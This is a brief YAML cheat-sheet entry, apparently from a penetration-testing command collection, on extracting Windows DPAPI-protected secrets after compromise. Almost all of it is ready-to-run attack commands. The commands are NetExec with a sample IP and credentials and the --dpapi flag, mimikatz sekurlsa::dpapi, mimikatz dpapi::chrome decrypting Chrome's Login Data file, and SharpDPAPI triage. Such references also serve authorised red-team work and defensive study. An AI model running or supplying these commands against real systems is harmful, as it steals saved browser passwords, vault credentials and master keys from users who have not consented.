---
description: |
  Extract credentials protected by Windows Data Protection API (DPAPI), including browser passwords, vault credentials, and master key decryption.
command: |
  nxc smb 10.10.10.27 -u sec_user -p 'P@ssw0rd' --dpapi
  mimikatz # sekurlsa::dpapi
  mimikatz # dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
  SharpDPAPI.exe triage
items:
  - Shell
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - SMB
techniques: []
references:
  - https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords
  - https://github.com/GhostPack/SharpDPAPI
---
